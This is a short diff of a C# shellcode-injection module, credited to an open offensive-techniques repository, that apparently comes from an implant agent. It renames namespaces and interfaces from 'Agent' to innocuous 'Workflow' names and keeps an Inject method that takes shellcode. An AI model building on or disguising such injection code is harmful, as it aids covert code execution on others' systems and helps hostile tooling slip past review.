@@ -1,10 +1,10 @@
-﻿using Agent.Interfaces;
-using Agent.Models;
+using Workflow.Contracts;
+using Workflow.Models;
 using Microsoft.Win32.SafeHandles;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace Agent
+namespace Workflow
 {
     //https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Native.cs
     //Credit: @plackyhacker
@@ -26,7 +26,7 @@ namespace Agent
             { "nqat", "67D69EC328C646633596BF39046FE76D" },
             { "nqua", "6F98ACAE82A620484CEE2E63A19DF0BC" },
         };
-        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> ITechnique.Inject(IRuntimeExecutor spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             if(!await spawner.Spawn(spawnOptions))
             {
